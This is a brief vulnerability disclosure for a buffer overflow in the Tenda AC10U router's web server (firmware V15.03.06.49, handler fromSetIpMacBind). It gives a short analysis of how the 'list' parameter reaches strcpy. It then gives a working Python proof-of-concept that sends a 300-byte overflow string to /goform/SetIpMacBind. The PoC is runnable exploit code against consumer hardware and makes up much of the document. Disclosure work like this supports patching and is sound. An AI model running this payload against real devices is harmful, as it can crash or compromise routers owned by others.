# buffer overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buffer overflow in httpd/fromSetIpMacBind

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](15.png)


get value from list, then static_list->list, finally call strcpy, cause buff overflow

but we must send bindnum between 0-33




## POC
```
url = "http://192.168.1.13/goform/SetIpMacBind"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list': payload , 'bindnum': 1})
``` 
